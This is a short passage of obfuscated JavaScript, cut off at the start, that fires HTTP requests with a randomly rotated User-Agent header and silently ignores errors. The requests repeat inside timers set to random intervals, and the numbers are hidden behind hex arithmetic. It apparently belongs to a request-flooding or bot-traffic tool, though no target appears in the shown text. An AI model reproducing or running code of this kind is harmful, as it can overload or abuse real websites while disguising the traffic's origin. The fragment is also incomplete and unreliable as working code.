        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1145 * 0x3 + -0x86d * 0x3 + 0xd0) * getRandomInt(0x1548 + 0x1b1a * 0x1 + 0x1 * -0x3061, -0x7f5 + 0x17c4 + -0x2 * 0x7e5));
}, -0x15a1 + 0x1 * -0xbdd + -0x10f1 * -0x2);